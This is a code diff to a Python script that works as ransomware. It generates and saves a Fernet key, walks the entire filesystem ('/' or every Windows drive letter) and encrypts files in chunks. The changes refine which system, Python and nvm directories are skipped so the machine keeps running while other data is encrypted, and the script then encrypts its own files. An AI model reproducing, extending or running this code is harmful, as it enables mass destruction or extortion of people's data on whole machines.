@@ -39,7 +39,7 @@ key = Fernet.generate_key()
 with open("thekey.key", "wb") as key_file:
     key_file.write(key)
 
-# Exclude specific files
+# Exclude specific files and directories
 EXCLUDE_FILES = {"main.py", "thekey.key", "decrypt.py"}
 
 # Get the Python environment path
@@ -48,12 +48,11 @@ python_env_path = os.path.dirname(os.path.dirname(sys.executable))
 # Get the Node.js environment path managed by nvm
 nvm_path = os.path.expanduser("~/.nvm")
 
-# Additional paths to exclude
-EXCLUDE_PATHS = [
-    os.path.abspath(python_env_path),
-    os.path.abspath(os.path.dirname(__file__)),
-    os.path.abspath(nvm_path),
-    '/usr/share'
+# Get common system paths to exclude
+system_paths = [
+    "/usr/share",
+    "/var/log",
+    "/dev"
 ]
 
 # Function to encrypt a file
@@ -71,6 +70,9 @@ def encrypt_file(file_path):
 # Function to get all files from a root directory
 def get_all_files(root_dir, exclude_paths):
     for root, _, files in os.walk(root_dir):
+        if any(os.path.commonpath([root, exclude]) == exclude for exclude in exclude_paths):
+            logging.debug(f"Skipping directory {root}")
+            continue
         for file in files:
             file_path = os.path.join(root, file)
             if os.path.basename(file_path) not in EXCLUDE_FILES and not any(os.path.commonpath([file_path, exclude]) == exclude for exclude in exclude_paths):
@@ -111,8 +113,13 @@ def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=10):
 # Main function
 def main():
     root_dirs = ["/"] if platform.system() != "Windows" else [drive + ":\\" for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(drive + ":\\")]
+    exclude_paths = [os.path.abspath(python_env_path), os.path.abspath(os.path.dirname(__file__)), os.path.abspath(nvm_path)]
+    
+    # Dynamically add system paths
+    exclude_paths.extend([os.path.abspath(path) for path in system_paths])
+    
     for root_dir in root_dirs:
-        encrypt_files_in_chunks(root_dir, EXCLUDE_PATHS)
+        encrypt_files_in_chunks(root_dir, exclude_paths)
     
     # Finally encrypt the current script
     for script in EXCLUDE_FILES:
@@ -122,6 +129,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
